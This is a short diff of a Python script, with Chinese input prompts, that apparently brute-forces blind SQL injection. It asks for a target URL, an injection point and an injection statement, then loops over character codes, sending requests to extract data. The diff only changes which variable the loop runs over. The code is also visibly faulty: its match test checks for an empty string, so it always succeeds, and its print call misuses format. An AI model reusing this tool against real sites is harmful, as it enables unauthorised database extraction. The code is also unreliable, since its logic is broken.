@@ -9,11 +9,11 @@ result2=int(input("输入查找长度"))
 url = input("输入url及注入点")
 data=input("输入注入语句")
 def fun(url,result,result2):
-    for i in range(result2):
+    for i in range(result):
         try:
-            reponse=requests.get(url+data.format(result,i))
+            reponse=requests.get(url+data.format(i,result2))
             if '' in reponse.text:
-                print(result,url+format(result,i),chr(i))
+                print(i,url+format(i,result2),chr(result2))
                 break
         except:continue
     return
